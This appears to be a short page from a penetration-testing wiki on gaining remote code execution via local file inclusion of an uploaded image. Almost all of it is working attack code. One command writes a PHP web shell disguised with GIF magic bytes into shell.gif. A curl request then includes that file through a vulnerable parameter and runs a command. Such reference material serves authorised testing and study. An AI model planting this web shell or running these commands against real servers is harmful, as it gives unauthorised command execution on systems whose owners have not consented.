---
authors: ShutdownRepo
category: web
---

# file upload

## Image Upload

> [!TIP]
> The prerequisite for this method is to be able to [upload a file](../../unrestricted-file-upload.md).

```bash
# GIF8 is for magic bytes
echo 'GIF8<?php system($_GET["cmd"]); ?' > shell.gif

curl --user-agent "PENTEST" "$URL/?parameter=/path/to/image/shell.gif&cmd=id"
```

> [!TIP]
> Other LFI to RCE via file upload methods may be found later on the chapter [LFI to RCE (via php wrappers)](file-upload.md#via-php-wrappers-and-streams).